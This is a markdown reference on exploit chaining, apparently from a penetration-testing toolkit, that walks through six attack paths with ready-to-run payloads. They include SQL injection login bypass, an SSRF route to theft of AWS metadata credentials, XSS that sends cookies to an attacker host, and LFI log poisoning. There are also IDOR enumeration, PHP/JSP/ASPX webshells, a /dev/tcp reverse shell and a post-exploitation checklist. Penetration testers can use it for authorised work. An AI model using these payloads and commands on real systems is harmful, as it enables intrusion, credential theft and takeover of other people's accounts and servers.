# Exploit Chaining Reference

## Philosophy
Single vulnerabilities rarely give full access. Real-world exploitation
chains multiple findings into an attack path: reconnaissance → initial
access → execution → privilege escalation → objective.

---

## Common Attack Chains

### Chain 1: SQLi → Auth Bypass → Admin RCE
```
1. RECON: Discover login form at /admin/login
2. SQLi:  ' OR 1=1-- - in username → bypass authentication
3. ADMIN: Upload PHP plugin/theme → webshell
4. RCE:   curl 'http://target/uploads/shell.php?c=id'
5. SHELL: Reverse shell → privilege escalation

Evidence trail:
- Screenshot of SQLi bypass
- Webshell upload success
- id/whoami output from shell
```

### Chain 2: SSRF → Cloud Metadata → Lateral Movement
```
1. RECON:  Discover URL fetch feature (PDF generator, webhook, import)
2. SSRF:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. CREDS:  Extract AWS AccessKeyId + SecretAccessKey + Token
4. PIVOT:  aws sts get-caller-identity  → confirm role
5. IMPACT: aws s3 ls → access S3 buckets with stolen role
           aws ec2 describe-instances → map internal infrastructure

Real payload sequence:
  Step 1: http://169.254.169.254/latest/meta-data/
  Step 2: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  Step 3: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

### Chain 3: XSS → Session Hijack → Account Takeover
```
1. RECON:  Find reflected XSS in search parameter
2. XSS:   <script>fetch('https://ATTACKER/steal?c='+document.cookie)</script>
3. STEAL:  Admin visits crafted link → session cookie exfiltrated
4. HIJACK: Set stolen cookie in browser → access admin panel
5. IMPACT: Admin panel functionality (user management, config, file upload)

Delivery:
- Craft URL with XSS payload
- Send to admin via support ticket, email, chat
- Catch cookie on attacker-controlled server
```

### Chain 4: LFI → Log Poisoning → RCE
```
1. RECON:  Discover LFI: http://target/?page=../../../../etc/passwd
2. POISON: Send request with PHP in User-Agent:
   curl -H "User-Agent: <?php system(\$_GET['c']); ?>" http://target/
3. TRIGGER: http://target/?page=../../../../var/log/apache2/access.log&c=id
4. RCE:    Command output visible in page → upgrade to reverse shell

Alternative log files:
- /var/log/apache2/access.log
- /var/log/nginx/access.log
- /var/log/auth.log (SSH + username injection)
- /proc/self/environ (sometimes writable via headers)
```

### Chain 5: IDOR → PII Leak → Credential Reuse
```
1. RECON:   /api/user/profile?id=1001 returns your data
2. IDOR:    /api/user/profile?id=1002 returns another user's data
3. HARVEST: Enumerate all user profiles → collect emails + metadata
4. OSINT:   Check breached credential databases for harvested emails
5. SPRAY:   Test reused passwords against login, VPN, email

Automation:
  ffuf -u 'http://target/api/user/profile?id=FUZZ' -w <(seq 1000 2000) \
    -H 'Cookie: session=TOKEN' -mc 200 -o idor_results.json
```

### Chain 6: File Upload → Webshell → Privilege Escalation
```
1. RECON:  Find file upload (avatar, document, import)
2. BYPASS: Upload shell.php.jpg or shell.pHp with image Content-Type
3. LOCATE: Find uploaded file path (response header, predictable path)
4. EXEC:   curl 'http://target/uploads/shell.php?c=id'
5. REVSHELL: curl 'http://target/uploads/shell.php?c=bash+-i+>%26+/dev/tcp/LHOST/4444+0>%261'
6. PRIVESC: python3 -c 'import pty;pty.spawn("/bin/bash")' → linpeas.sh

Webshell payloads:
  PHP:  <?php system($_GET['c']); ?>
  JSP:  <% Runtime.getRuntime().exec(request.getParameter("c")); %>
  ASPX: <%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd", "/c " + Request["c"]); %>
```

---

## Chaining Methodology

### Step 1: Map the Attack Surface
```
From recon outputs:
- endpoints.json → entry points
- services.json → vulnerable services
- tech_fingerprint.json → known CVEs for stack
- vulns.json → confirmed vulnerabilities
```

### Step 2: Identify Chain Potential
```
Look for combinations:
- Auth bypass + admin functionality = deeper access
- SSRF + internal services = internal network access
- File read (LFI/XXE) + config files = credentials
- Any vuln + credential exposure = pivot opportunity
- Web shell + kernel exploit = root
```

### Step 3: Build the Path
```
Order of operations:
1. Start with lowest-risk vuln (info disclosure, IDOR)
2. Chain to medium-risk (auth bypass, SSRF)
3. Escalate to high-risk (RCE, shell access)
4. Pivot internally (discovery skill)
5. Document each step with evidence
```

### Step 4: Document the Chain
```json
{
  "chain_name": "Web to Root via SQLi + File Upload",
  "steps": [
    {"step": 1, "vuln": "SQLi", "technique": "T1190", "impact": "Auth bypass"},
    {"step": 2, "vuln": "File Upload", "technique": "T1190", "impact": "Webshell"},
    {"step": 3, "vuln": "Kernel CVE", "technique": "T1068", "impact": "Root shell"}
  ],
  "total_impact": "Full system compromise",
  "evidence": ["evidence/sqli_bypass.png", "evidence/webshell.txt", "evidence/root_shell.png"]
}
```

---

## Post-Exploitation Pivot Checklist

After gaining initial shell access:
```bash
# 1. Identify context
id && whoami && hostname && uname -a

# 2. Network position
ip a && ip route && cat /etc/resolv.conf

# 3. Quick wins
sudo -l                                # sudo permissions
find / -perm -4000 2>/dev/null         # SUID binaries
cat /etc/crontab                       # cron jobs
ls -la /home/                          # other users
cat /etc/passwd | grep -v nologin      # real users

# 4. Hand off to discovery skill
# Run internal enumeration for lateral movement opportunities
```
